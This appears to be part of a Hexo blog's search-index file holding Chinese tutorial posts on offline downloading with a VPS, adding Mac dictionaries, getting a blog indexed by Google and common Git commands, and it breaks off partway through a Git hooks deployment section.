epel-release</span><br><span class="line">&gt;yum -y install python-pip</span><br><span class="line">&gt;yum clean all</span><br></pre></td></tr></table></figure><p>说明：先装扩展源EPEL再装Python Pip才不会报错。</p><h3 id="安装Requests"><a href="#安装Requests" class="headerlink" title="安装Requests"></a>安装Requests</h3><p>pip install requests</p><p>完成以上步骤后，才开始正式安装bypy。</p><p>依次执行以下三行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;git <span class="built_in">clone</span> https://github.com/houtianze/bypy byby/</span><br><span class="line">&gt;<span class="built_in">cd</span> byby/</span><br><span class="line">&gt;python bypy.py list</span><br></pre></td></tr></table></figure><p>此时的命令行界面会出现提示，按照以下步骤来授权你的百度云账号使用bypy客户端：</p><p>左键选中用于百度账号授权的那行URL，即可复制该文本（在Putty中选中即可复制，不用Ctrl+C），在浏览器中打开此链接。<br>登录你的百度账号，然后复制授权码。<br>回到Putty命令行界面，粘贴授权码进去，回车即可开始启动授权操作。<br>稍等几秒，授权即可成功。</p><p>为了方便在任意目录下使用bypy命令，还需要设置如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="built_in">cd</span> /byby</span><br><span class="line">&gt;cp bypy.py /usr/bin</span><br></pre></td></tr></table></figure><p>完成以上设置后，如果要将VPS某个文件夹下的所有文件上传到百度云，最简单的命令如下：</p><p><code>bypy.py upload</code></p><p>还可以加参数，如 -v 可以显示上传进度：</p><p><code>bypy.py upload -v</code></p><p>默认情况下，本方案上传到百度云的文件全部存放在“我的应用数据 –&gt; bypy”路径下。</p><h2 id="4-下载与上传视频"><a href="#4-下载与上传视频" class="headerlink" title="4 下载与上传视频"></a>4 下载与上传视频</h2><p>在Putty命令行界面中创建一个专门的目录用于存放下载的视频文件，然后CD至此目录下，创建一个包含所有下载链接的txt文件（使用vi命令即可）。在此目录下，执行下载命令：</p><p><code>youtube-dl -c -i -a video_url.txt</code></p><p>呃，眼尖的你可能已经发现了，上面这条命令好像多出了两个参数？没错，youtube-dl提供了很多有用的附加参数，这里用到的是：</p><p>-c 断点续传（如果由于意外原因下载中断了，再次启动下载命令时，可以实现断点续传）<br>-i 忽略报错（如果出现某些链接无法打开或者下载的问题，会自动绕过，继续下载其他视频）<br>下载的话一般很快，但是上传到百度云并没有那么快。为了防止关闭Putty窗口后，下载/上传进程就断掉了，可以考虑使用Screen远程会话管理功能。简单介绍就是，有了这玩意儿，你可以在Putty中启动下载或者上传进程，让其在后台运行，然后关掉Putty离开电脑旁该干啥干啥去，有需要的话回来重新打开窗口就可以看到进程依然在跑。</p><p>要检查操作系统是否支持screen，可以直接输入screen然后回车，如果提示找不到这个命令，那就是系统还没安装好这个东西。在CentOS 7中安装screen很简单，一条命令而已：</p><p><code>yum install screen</code></p><p>安装完毕后，输入 screen -S sessionname 即可创建一个名为 sessionname 的screen会话窗口。在此窗口中执行想要做的任务，然后同时按下 ctrl + a，松开后按下 d，即可将此session放到后台去运行，并回到之前的对话窗口。在非screen对话窗口中，输入 screen -ls 可以列举已有的screen进程。输入 “screen -r 进程代码” 就可以再次调出正在运行的screen进程。</p><p>由于我要上传到百度云的文件太多了，我不可能守在电脑前等它完成所有任务，所以screen这个功能还是非常实用的。</p><p>本文主要参考链接：<br><a href="https://github.com/rg3/youtube-dl/" target="_blank" rel="noopener">https://github.com/rg3/youtube-dl/</a><br><a href="https://github.com/houtianze/bypy" target="_blank" rel="noopener">https://github.com/houtianze/bypy</a><br><a href="http://yesido.info/2015/03/linux-upload-document-to-baidu-cloud/（编者按：链接已失效）" target="_blank" rel="noopener">http://yesido.info/2015/03/linux-upload-document-to-baidu-cloud/（编者按：链接已失效）</a></p></blockquote><p>原文链接：<a href="http://www.typemylife.com/use-vps-download-videos-from-youtube-upload-to-baidu-cloud/" target="_blank" rel="noopener">http://www.typemylife.com/use-vps-download-videos-from-youtube-upload-to-baidu-cloud/</a></p>]]></content>
      
      
      <categories>
          
          <category> 日常技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 离线下载 </tag>
            
            <tag> VPS </tag>
            
            <tag> 百度云 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VPS离线下载之一</title>
      <link href="/post/vps-download-part-I/"/>
      <url>/post/vps-download-part-I/</url>
      
        <content type="html"><![CDATA[<p>有一台VPS可以做各种各样好玩儿的东西，这不，楼主开始折腾离线下载了。</p><a id="more"></a><h1 id="离线下载概述"><a href="#离线下载概述" class="headerlink" title="离线下载概述"></a>离线下载概述</h1><p>既然我们要使用服务器离线下载，首先来了解一下离线下载的原理：<br><img src="http://ohx73ws1b.bkt.clouddn.com/%E7%A6%BB%E7%BA%BF%E4%B8%8B%E8%BD%BD.png" alt=""></p><p>那么离线下载有什么优势呢？</p><ol><li>对于一些慢速的大文件，可以扔到服务器上慢慢下，下好了再取回本地，避免长时间的等待；</li><li>如果你的vps位于国外，有些资源的下载vps速度更快，本地你可能耗时一整天都不一定能下完，就算下完了也可能是一个损坏的文件包，而vps几乎可以做到秒下，然后将下载好的资源同步到国内的百度云，这样绕个弯子会节省不少的时间。</li></ol><h1 id="离线下载方式"><a href="#离线下载方式" class="headerlink" title="离线下载方式"></a>离线下载方式</h1><p>在Linux系统中有这样几种命令行下载方式：</p><h3 id="1-wget"><a href="#1-wget" class="headerlink" title="1. wget"></a>1. wget</h3><p>wget命令用来从指定的URL下载文件。wget非常稳定，它在带宽很窄的情况下和不稳定网络中有很强的适应性，如果是由于网络的原因下载失败，wget会不断的尝试，直到整个文件下载完毕。如果是服务器打断下载过程，它会再次联到服务器上从停止的地方继续下载。这对从那些限定了链接时间的服务器上下载大文件非常有用。</p><h3 id="2-curl"><a href="#2-curl" class="headerlink" title="2. curl"></a>2. curl</h3><p>curl命令是一个利用URL规则在命令行下工作的文件传输工具。它支持文件的上传和下载，所以是综合传输工具，但按传统，习惯称curl为下载工具。作为一款强力工具，curl支持包括HTTP、HTTPS、ftp等众多协议，还支持POST、cookies、认证、从指定偏移处下载部分文件、用户代理字符串、限速、文件大小、进度条等特征。</p><h3 id="3-axel"><a href="#3-axel" class="headerlink" title="3. axel"></a>3. axel</h3><p>axel是Linux下一个不错的HTTP/ftp高速下载工具。支持多线程下载、断点续传，且可以从多个地址或者从一个地址的多个连接来下载同一个文件。适合网速不给力时多线程下载提高下载速度。比如在国内VPS或服务器上下载lnmp一键安装包用Axel就比wget快。</p><h3 id="4-aria2"><a href="#4-aria2" class="headerlink" title="4. aria2"></a>4. aria2</h3><p>Aria2是一个基于命令行的开源下载工具，支持多协议、多来源(HTTP/HTTPS、FTP、BitTorrent、Metalink协议等)、多线程的下载。它比axel优秀的地方在于完全支持BitTorrent协议，同时可以作为BitTorrent客户端来下载种子文件,支持Metalink协议,远程控制(通过web端)下载进程。</p><p>主要优势如下：</p><ul><li>高速，自动多线程下载；</li><li>断点续传；</li><li>轻量占用内存非常少，通常情况平均4~9MB内存占用(官方介绍)；</li><li>多平台。支援 Win/Linux/OSX/Android 等操作系统下的部署；</li><li>模块化。分段下载引擎，文件整合速度快；</li><li>支持RPC界面远程；</li><li>全面支持BitTorrent协议；</li></ul><p>Aria2官方项目页面：<a href="https://aria2.github.io/" target="_blank" rel="noopener">https://aria2.github.io/</a></p><p>关于Aria2的安装和使用教程请参见：<a href="http://www.hi-linux.com/2016/05/09/CentOS%E4%B8%8B%E6%90%AD%E5%BB%BAAria2%E8%BF%9C%E7%A8%8B%E4%B8%8B%E8%BD%BD%E7%8E%AF%E5%A2%83/" target="_blank" rel="noopener">CentOS下搭建Aria2远程下载环境</a></p><h3 id="5-各种下载工具的比较"><a href="#5-各种下载工具的比较" class="headerlink" title="5. 各种下载工具的比较"></a>5. 各种下载工具的比较</h3><table><thead><tr><th align="center">协议</th><th align="center">wget</th><th align="center">curl</th><th align="center">axel</th><th align="center">aria</th></tr></thead><tbody><tr><td align="center">HTTP(S)</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td></tr><tr><td align="center">FTP</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td></tr><tr><td align="center">SFTP</td><td align="center">✗</td><td align="center">✓</td><td align="center">✗</td><td align="center">✗</td></tr><tr><td align="center">BitTorrent</td><td align="center">✗</td><td align="center">✗</td><td align="center">✗</td><td align="center">✓</td></tr><tr><td align="center">Metalink</td><td align="center">✗</td><td align="center">✗</td><td align="center">✗</td><td align="center">✓</td></tr><tr><td align="center">Telnet</td><td align="center">✗</td><td align="center">✓</td><td align="center">✗</td><td align="center">✗</td></tr><tr><td align="center">IMAP</td><td align="center">✗</td><td align="center">✓</td><td align="center">✗</td><td align="center">✗</td></tr><tr><td align="center">POP3</td><td align="center">✗</td><td align="center">✓</td><td align="center">✗</td><td align="center">✗</td></tr><tr><td align="center">SMTP</td><td align="center">✗</td><td align="center">✓</td><td align="center">✗</td><td align="center">✗</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 日常技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 离线下载 </tag>
            
            <tag> aria2 </tag>
            
            <tag> wget </tag>
            
            <tag> curl </tag>
            
            <tag> axel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>增强你的Mac词典</title>
      <link href="/post/enhance-mac-dicts/"/>
      <url>/post/enhance-mac-dicts/</url>
      
        <content type="html"><![CDATA[<p>Mac自带的词典功能远比你想象的强大,你完全可以自定义你的词典。</p><a id="more"></a><p>Mac自带的词典功能，不仅能用三指轻触查询，如果你对词典不满意，还可以自己添加词典，如牛津、朗文、英汉、汉英、法汉、德汉、汉法、汉德、日汉、汉日；甚至康熙大辞典，以及湘雅医学专业词典。只要你能找到合适的词典包即可。所以完全没有必要安装有道词典等第三方词典。</p><h3 id="1-下载词典转换工具"><a href="#1-下载词典转换工具" class="headerlink" title="1 下载词典转换工具"></a>1 下载词典转换工具</h3><p>DictUnifier下载地址：<a href="https://github.com/jjgod/mac-dictionary-kit" target="_blank" rel="noopener">https://github.com/jjgod/mac-dictionary-kit</a></p><h3 id="2-下载词典包"><a href="#2-下载词典包" class="headerlink" title="2 下载词典包"></a>2 下载词典包</h3><p>词典包下载地址：<a href="http://abloz.com/huzheng/stardict-dic/zh_CN/" target="_blank" rel="noopener">http://abloz.com/huzheng/stardict-dic/zh_CN/</a></p><h3 id="3-词典转换"><a href="#3-词典转换" class="headerlink" title="3 词典转换"></a>3 词典转换</h3><p>打开DictUnifier，然后将下载好的词典包拖拽到DictUnifier中，按照提示操作即可。</p><p>一般来说，词典包安装后，Dictionary会自动打开，这时你就会发现新增的词典了。</p><p>特别提醒：有些Mac OS版本，需要在Dictionary的偏好设置里面（command加逗号），把需要的词典勾选一下～</p><h3 id="4-删除词典"><a href="#4-删除词典" class="headerlink" title="4 删除词典"></a>4 删除词典</h3><p>对于不想要的词典：</p><ol><li>在Dictionary界面不显示——在Dictionary的“系统设置”里面，把不想用的词典前面的“对勾”去掉</li><li>想完全删去——在下面这两个文件夹内，找到相应的.dictionary文件，delete<ul><li>Macintosh HD/Library/Dictionaries文件夹</li><li>Macintosh HD/Users/你的用户名/Library/Dictionaries文件夹</li></ul></li></ol><p>一篇详细的英文参考教程：<a href="https://davidtse916.wordpress.com/2008/01/24/adding-dictionaries-to-the-built-in-dictionary-application-in-leopard/" target="_blank" rel="noopener">https://davidtse916.wordpress.com/2008/01/24/adding-dictionaries-to-the-built-in-dictionary-application-in-leopard/</a></p><h3 id="其他词典工具推荐"><a href="#其他词典工具推荐" class="headerlink" title="其他词典工具推荐"></a>其他词典工具推荐</h3><p>GoldenDict是一个开源的词典项目，可在Windows、Mac、Linux全平台下使用，而且支持中文，项目主页<a href="https://github.com/goldendict/goldendict/wiki" target="_blank" rel="noopener">https://github.com/goldendict/goldendict/wiki</a></p><p>GoldenDict添加网络词典教程：<a href="https://www.shanbay.com/team/thread/34543/938905/" target="_blank" rel="noopener">https://www.shanbay.com/team/thread/34543/938905/</a></p><p>GoldenDict添加本地词典教程：<a href="http://jingyan.baidu.com/article/f25ef254459199482c1b829c.html" target="_blank" rel="noopener">http://jingyan.baidu.com/article/f25ef254459199482c1b829c.html</a></p><p>与GoldenDict类似的还有StarDict，不过该项目因为版权问题已经停止维护了。</p>]]></content>
      
      
      <categories>
          
          <category> 日常技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mac </tag>
            
            <tag> 词典 </tag>
            
            <tag> 效率 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何让你的博客被Google收录</title>
      <link href="/post/how-to-make-you-blog-included-by-google/"/>
      <url>/post/how-to-make-you-blog-included-by-google/</url>
      
        <content type="html"><![CDATA[<p>hexo搭建的博客快速让Google收录教程</p><a id="more"></a><h3 id="1-注册一个谷歌账号"><a href="#1-注册一个谷歌账号" class="headerlink" title="1 注册一个谷歌账号"></a>1 注册一个谷歌账号</h3><p>打开<a href="https://www.google.com/webmasters/tools/home?hl=zh-CN" target="_blank" rel="noopener">Google搜索引擎提交入口</a></p><h3 id="2-下载验证文件"><a href="#2-下载验证文件" class="headerlink" title="2 下载验证文件"></a>2 下载验证文件</h3><p><img src="http://babymaychen.github.io/uploads/downloadCheck.png" alt="验证文件"></p><p>下载Google的验证文件之后，需要在文件开头添加layout: false来取消hexo对其进行的转换，如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">$</span> <span class="string">cat</span> <span class="string">source/google0b4c8a25b65d7c2a.html</span></span><br><span class="line"><span class="attr">layout:</span> <span class="literal">false</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">google-site-verification:</span> <span class="string">google0b4c8a25b65d7c2a.html</span></span><br></pre></td></tr></table></figure><h3 id="3-将验证文件放入网站的根目录"><a href="#3-将验证文件放入网站的根目录" class="headerlink" title="3 将验证文件放入网站的根目录"></a>3 将验证文件放入网站的根目录</h3><p>以GitHub为例，打开博客主页，点击”Upload files”，将验证文件放入项目根目录</p><h3 id="4-访问验证文件"><a href="#4-访问验证文件" class="headerlink" title="4 访问验证文件"></a>4 访问验证文件</h3><p>然后打开浏览器输入：http://你的网站域名/你下载的验证文件名字.html ，如果你看到了一串字符(注：只有一串字符)，那就成功了。</p><h3 id="5-添加站点地图"><a href="#5-添加站点地图" class="headerlink" title="5 添加站点地图"></a>5 添加站点地图</h3><p>什么是站点地图呢？Google的解释是:</p><blockquote><p>站点地图是一种文件，您可以通过该文件列出您网站上的网页，从而将您网站内容的组织架构告知Google和其他搜索引擎。Googlebot等搜索引擎网页抓取工具会读取此文件，以便更加智能地抓取您的网站。</p></blockquote><p>对于使用Hexo写博客的小伙伴来说，可以使用 hexo-generator-sitemap 插件来生成Sitemap。插件的使用很简单，只需要下载即可：</p><p><code>npm install hexo-generator-sitemap --save</code></p><p>在博客根目录的_config.yml中添加如下代码：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">sitemap:</span></span><br><span class="line"><span class="symbol">path:</span> sitemap.xml</span><br></pre></td></tr></table></figure><p>这里的缩进很重要(不解释，试一下就知道了),然后编译并部署博客。</p><h3 id="6-让Google收录博客"><a href="#6-让Google收录博客" class="headerlink" title="6 让Google收录博客"></a>6 让Google收录博客</h3><p>向<a href="https://www.google.com/webmasters/tools" target="_blank" rel="noopener">Google站长工具</a>提交sitemap</p><p>添加了站点验证通过后，选择站点，之后在抓取——站点地图中就能看到添加/测试站点地图<br><img src="http://babymaychen.github.io/uploads/sitemap.png" alt=""></p><p>本文参考了以下文章：<a href="http://babymaychen.github.io/2016/07/20/%E5%A6%82%E4%BD%95%E8%AE%A9%E4%BD%A0%E7%9A%84%E5%8D%9A%E5%AE%A2%E8%A2%ABGoogle%E5%88%B0/" target="_blank" rel="noopener">孙小妹的博客</a></p>]]></content>
      
      
      <categories>
          
          <category> 日常技术 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Git常用命令总结</title>
      <link href="/post/git-notes/"/>
      <url>/post/git-notes/</url>
      
        <content type="html"><![CDATA[<p>这可能是东半球最详细的Git命令总结了:-)</p><a id="more"></a><blockquote><p>Git使用教程——<a href="https://git-scm.com/book/zh/v2" target="_blank" rel="noopener">《Pro Git》</a><br><br><br>Git视频教程<a href="http://study.163.com/course/courseMain.htm?courseId=1003268008" target="_blank" rel="noopener">人人都会用git</a><br><br><br>git在本地分为3个区：工作区，暂存区和本地仓库。<br><br><br>Git更像是把数据看作是对小型文件系统的一组快照。每次你提交更新，或在 Git 中保存项目状态时，它主要对当时的全部文件制作一个快照并保存这个快照的索引。为了高效，如果文件没有修改，Git 不再重新存储该文件，而是只保留一个链接指向之前存储的文件。 Git 对待数据更像是一个快照流。<br><br><br>git中任何<em>已提交</em>的东西几乎总是可以恢复的。 甚至那些被删除的分支中的提交或使用 –amend 选项覆盖的提交也可以恢复<br><br><br><a href="https://dotblogs.com.tw/wasichris/2016/04/29/225157" target="_blank" rel="noopener">[Git] Reset - mixed, hard and soft</a><br><a href="https://www.zybuluo.com/phper/note/223883" target="_blank" rel="noopener">git pull和git fetch、git reset 和 git revert 的区别用法</a></p></blockquote><hr><h1 id="一、本地操作"><a href="#一、本地操作" class="headerlink" title="一、本地操作"></a>一、本地操作</h1><h2 id="1-1-基础命令"><a href="#1-1-基础命令" class="headerlink" title="1.1 基础命令"></a>1.1 基础命令</h2><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td><code>git init [directory]</code></td><td>初始化git本地仓库</td></tr><tr><td>`git reset –hard commit-id</td><td>HEAD^</td></tr><tr><td><code>git relog</code></td><td>查看git历史操作命令</td></tr><tr><td><code>git rm --cached file_name</code></td><td>删除暂存区的文件,如果暂存区的文件<strong>被修改</strong>，则<strong>需要使用<code>-f</code>参数</strong></td></tr><tr><td><code>git mv file_from file_to</code></td><td>修改文件名</td></tr><tr><td><code>git reset HEAD filename</code></td><td>取消暂存的文件（丢弃<code>git add</code>后的文件）</td></tr><tr><td><code>git checkout .</code></td><td>丢弃工作区所有文件的修改</td></tr><tr><td><code>git checkout -- filename</code></td><td>丢弃工作区指定文件的修改（ <em>注意文件名前的空格</em> ）</td></tr><tr><td><code>git checkout HEAD .</code></td><td>丢弃工作区与暂存区的所有文件的修改</td></tr><tr><td><code>git checkout HEAD -- filename</code></td><td>丢弃总做区与暂存区指定文件的修改</td></tr><tr><td><code>git config --list</code></td><td>查看git的配置信息</td></tr></tbody></table><h2 id="1-2-克隆"><a href="#1-2-克隆" class="headerlink" title="1.2 克隆"></a>1.2 克隆</h2><p>Git 克隆的是该 Git 仓库服务器上的几乎所有数据，而不是仅仅复制完成你的工作所需要文件。 当你执行 git clone 命令的时候，默认配置下远程 Git 仓库中的每一个文件的每一个版本都将被拉取下来。</p><p>克隆命令：<code>git clone git@github.com:user/repo.git  [local_repo_name]</code><br>clone时端口号不为默认的22时，需将命令修改为 <code>$git clone ssh://user@host:port/user/repo.git [local_repo_name]</code></p><h2 id="1-3-比较"><a href="#1-3-比较" class="headerlink" title="1.3 比较"></a>1.3 比较</h2><p><code>git diff</code>查看工作区与暂存区文件的差异<br><code>git diff --cached</code>查看暂存区与本地仓库的文件差异<br><code>git diff HEAD</code>查看工作区与本地仓库的文件差异</p><h2 id="1-4-提交"><a href="#1-4-提交" class="headerlink" title="1.4 提交"></a>1.4 提交</h2><p><code>git commit -m &#39;description&#39;</code><br><code>git commit -a -m &#39;description&#39;</code>将<code>git add</code>与<code>git commit</code>命令合并使用，此时会自动将已跟踪的文件加入暂存并提交<br><code>git commit --amend</code>修改提交信息。若文件A已经提交，然后发现文件B忘记提交，可以执行<code>git add B</code>后执行<code>git commit --amend</code>，来实现A，B同时提交的效果。</p><h2 id="1-5-储藏"><a href="#1-5-储藏" class="headerlink" title="1.5 储藏"></a>1.5 储藏</h2><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td><code>git stash</code></td><td>将当前工作区内容储藏</td></tr><tr><td><code>git stash list</code></td><td>查看储藏的所有内容</td></tr><tr><td><code>git stash show -p stash@{n}</code></td><td>显示储藏内容</td></tr><tr><td><code>git stash apply</code></td><td>将最近储藏的文件取回到工作区，栈中仍存在该储藏文件</td></tr><tr><td><code>git stash apply stash@{n}</code></td><td>取出指定储藏的文件</td></tr><tr><td><code>git stash pop</code></td><td>应用储藏并删除栈中内容</td></tr><tr><td><code>git stash drop stash@{n}</code></td><td>丢弃储藏内容</td></tr><tr><td><code>git stash -u</code></td><td>暂存未被跟踪的文件</td></tr></tbody></table><h2 id="1-6-查看历史"><a href="#1-6-查看历史" class="headerlink" title="1.6 查看历史"></a>1.6 查看历史</h2><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td><code>git log</code></td><td>显示详细记录</td></tr><tr><td><code>git log -p -2</code></td><td>查看最近2次的提交信息，包括被改动的内容</td></tr><tr><td><code>git log --stat</code></td><td>显示每次提交的统计信息</td></tr><tr><td><code>git log --pretty=oneline</code> 或 <code>git log --oneline</code></td><td>简要显示提交信息</td></tr><tr><td><code>git log --graph</code></td><td>图形化显示分支、合并历史</td></tr><tr><td><br></td><td></td></tr></tbody></table><center> `git log`输出选项</center><table><thead><tr><th align="left">选项</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><code>-n</code></td><td align="left">仅显示最近的n条提交</td></tr><tr><td align="left"><code>--since</code>, <code>--after</code></td><td align="left">仅显示指定时间之后的提交</td></tr><tr><td align="left"><code>--until</code>, <code>--before</code></td><td align="left">仅显示指定时间之前的提交</td></tr><tr><td align="left"><code>--author</code></td><td align="left">仅显示指定作者相关的提交</td></tr><tr><td align="left"><code>--committer</code></td><td align="left">仅显示指定提交者的相关提交</td></tr><tr><td align="left"><code>--grep</code></td><td align="left">仅显示含指定关键字的提交</td></tr><tr><td align="left"><code>--decorate</code></td><td align="left">查看指针情况</td></tr><tr><td align="left"><code>-S</code></td><td align="left">仅显示添加或移除了某个关键字的提交</td></tr></tbody></table><h2 id="1-7-变基"><a href="#1-7-变基" class="headerlink" title="1.7 变基"></a>1.7 变基</h2><p><strong>请勿在本地仓库外有副本的分支执行变基操作！</strong><br>变基能够让提交历史变得更加简洁。<br>只对尚未推送或分享给别人的本地修改执行变基操作清理历史，从不对已推送至别处的提交执行变基操作。<br><code>git rebase master dev</code>将dev分支内容变基到master分支上</p><p>变基前：<br><img src="http://ohx73ws1b.bkt.clouddn.com/git%20branch.png" alt=""></p><p>变基后：<br><img src="http://ohx73ws1b.bkt.clouddn.com/git%20rebase.png" alt=""></p><p>假设你希望将 client 中的修改合并到主分支并发布，但暂时并不想合并 server 中的修改，因为它们还需要经过更全面的测试。 这时，你就可以使用 git rebase 命令的 –onto 选项，选中在 client 分支里但不在 server 分支里的修改（即 C8 和 C9），将它们在 master 分支上重放：<code>$ git rebase --onto master server client</code><br>多分支变基前：<br><img src="http://ohx73ws1b.bkt.clouddn.com/%E5%A4%9A%E5%88%86%E6%94%AF%E5%8F%98%E5%9F%BA.png" alt=""><br>多分支变基后<br><img src="http://ohx73ws1b.bkt.clouddn.com/%E5%A4%9A%E5%88%86%E6%94%AF%E5%8F%98%E5%9F%BA%E7%BB%93%E6%9E%9C.png" alt=""></p><hr><h1 id="二、远程仓库"><a href="#二、远程仓库" class="headerlink" title="二、远程仓库"></a>二、远程仓库</h1><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td><code>git remote</code></td><td>显示本地仓库关联的所有远程仓库</td></tr><tr><td><code>git remote -v</code></td><td>显示远程仓库的URL</td></tr><tr><td><code>git remote add local-repo-name url</code></td><td>关联远程仓库</td></tr><tr><td><code>git remote rm local-repo-name</code></td><td>取消与远程仓库的关联</td></tr><tr><td><code>git fetch remote-name</code></td><td>拉取远程仓库的所有分支</td></tr><tr><td><code>git push remote-name branch-name</code></td><td>将当前分支推送到远程分支</td></tr><tr><td><code>git remote show [remote-name]</code></td><td>显示指定远程仓库的详细信息</td></tr><tr><td><code>git remote rename old-name new-name</code></td><td>重命名远程仓库名</td></tr></tbody></table><hr><h1 id="三、分支"><a href="#三、分支" class="headerlink" title="三、分支"></a>三、分支</h1><h2 id="3-1-基础命令"><a href="#3-1-基础命令" class="headerlink" title="3.1 基础命令"></a>3.1 基础命令</h2><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td><code>git branch branch-name [commit-hash]</code></td><td>新建分支</td></tr><tr><td><code>git checkout branch-name</code></td><td>切换分支</td></tr><tr><td><code>git checkout -b branch-name</code></td><td>新建并切换到新分支</td></tr><tr><td><code>git branch</code></td><td>查看本地分支</td></tr><tr><td><code>git branch -r</code></td><td>查看远程分支</td></tr><tr><td><code>git branch -a</code></td><td>查看所有分支</td></tr><tr><td><code>git branch -d branch-name</code></td><td>删除分支</td></tr><tr><td><code>git merge branch-name</code></td><td>合并分支到当前分支</td></tr><tr><td><code>git branch --merged</code></td><td>查看已经合并分支</td></tr><tr><td><code>git branch --no-merged</code></td><td>查看尚未合并的分支</td></tr><tr><td><code>git branch -v</code></td><td>查看分支的最后一次提交</td></tr><tr><td><code>git branch -vv</code></td><td>查看本地分支的跟踪分支, 示例<a href="https://git-scm.com/book/zh/v2/Git-分支-远程分支" target="_blank" rel="noopener">点此</a></td></tr><tr><td><code>git push origin test:master</code></td><td>本地分支test推送给远程master分支（若master不存在，则自动创建）</td></tr><tr><td><code>git push origin :test</code> 或 <code>git push origin --delete test</code></td><td>删除远程test分支</td></tr></tbody></table><br>## 3.2 分支合并分支合并时直接会将内容覆盖<p><img src="http://ohx73ws1b.bkt.clouddn.com/branch_merge.png" alt="分支合并"></p><br>## 3.3 分支冲突仅当修改**同一文件的同一区域**的时候才会产生冲突，git无法执行“快速合并”（如下图）的合并就可能产生冲突<p><img src="http://ohx73ws1b.bkt.clouddn.com/branch_conflict.png" alt="分支冲突"><br>分支冲突解决后，需要使用<code>git add</code>和<code>git commit</code>命令再次提交</p><br>>由于 Git 的分支实质上仅是包含所指对象校验和（长度为 40 的 SHA-1 值字符串）的文件，所以它的创建和销毁都异常高效。 创建一个新分支就相当于往一个文件中写入 41 个字节（40 个字符和 1 个换行符），如此的简单能不快吗？<hr><h1 id="四、Github中的项目地址"><a href="#四、Github中的项目地址" class="headerlink" title="四、Github中的项目地址"></a>四、Github中的项目地址</h1><ul><li>HTTPS形式：<code>https://github.com/&lt;user&gt;/&lt;project_name&gt;</code></li><li>SSH形式：<code>git@github.com:&lt;user&gt;/&lt;project_name&gt;</code></li><li>通常对于公开项目可以优先分享基于 HTTPS 的 URL，因为用户克隆项目不需要有一个 GitHub 帐号。 如果你分享 SSH URL，用户必须有一个帐号并且上传 SSH 密钥才能访问你的项目。 HTTPS URL 与你贴到浏览器里查看项目用的地址是一样的。</li></ul><hr><h1 id="五、使用Git-Hooks实现项目自动部署"><a href="#五、使用Git-Hooks实现项目自动部署" class="headerlink" title="五、使用Git Hooks实现项目自动部署"></a>五、使用Git Hooks实现项目自动部署</h1><p>YouTube视频教程：<a href="https://www.youtube.com/watch?v=7-qAb4YZF2g" target="_blank" rel="noopener">Git deploy to staging server using post-receive hook<br>Auto-Buffer Options</a><br>git钩子教程：<a href="https://git-scm.com/book/zh/v2/%E8%87%AA%E5%AE%9A%E4%B9%89-Git-Git-%E9%92%A9%E5%AD%90" target="_blank" rel="noopener">Git钩子</a></p><h2 id="第一步：在服务器上创建一个git裸仓库"><a href="#第一步：在服务器上创建一个git裸仓库" class="headerlink" title="第一步：在服务器上创建一个git裸仓库"></a>第一步：在服务器上创建一个git裸仓库</h2><p><code>$ sudo git init --bare sample.git  #创建一个名为sample的git裸仓库</code></p><h2 id="第二步：配置裸仓库下的hooks文件夹的下post-receive（若该文件不存在请手动创建），配置内容为："><a href="#第二步：配置裸仓库下的hooks文件夹的下post-receive（若该文件不存在请手动创建），配置内容为：" class="headerlink" title="第二步：配置裸仓库下的hooks文件夹的下post-receive（若该文件不存在请手动创建），配置内容为："></a>第二步：配置裸仓库下的hooks文件夹的下post-receive（若该文件不存在请手动创建），配置内容为：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">GIT_WORK_TREE=/home/wwwroot/wxsxy/wxsxy git checkout -f  <span class="comment"># 此处设置你要部署的项目目录即可</span></span><br></pre></td></tr></table></figure><p>然后为此脚本赋予可执行权限<code>chmod +x post-receive</code></p><h2 id="第三步：（目前方法一存在无法推送的问题）"><a href="#第三步：（目前方法一存在无法推送的问题）" class="headerlink" title="第三步：（目前方法一存在无法推送的问题）"></a>第三步：（目前方法一存在无法推送的问题）</h2><h3 id="方法一：本地仓库关联远程裸仓库"><a href="#方法一：本地仓库关联远程裸仓库" class="headerlink" title="方法一：本地仓库关联远程裸仓库"></a>方法一：本地仓库关联远程裸仓库</h3><p><code>git remote add origin ssh://root@107.182.180.235:26972/home/bare.git（端口号非默认22的情况 ）</code><br>然后本地仓库中代码编辑完成后推送至远程裸仓库，裸仓库会自动将代码部署到服务器的项目地址下<br><code>git push origin master</code></p><h3 id="方法二：git-clone裸仓库（克隆自动关联），然后在裸仓库中添加代码推送即可"><a href="#方法二：git-clone裸仓库（克隆自动关联），然后在裸仓库中添加代码推送即可" class="headerlink" title="方法二：git 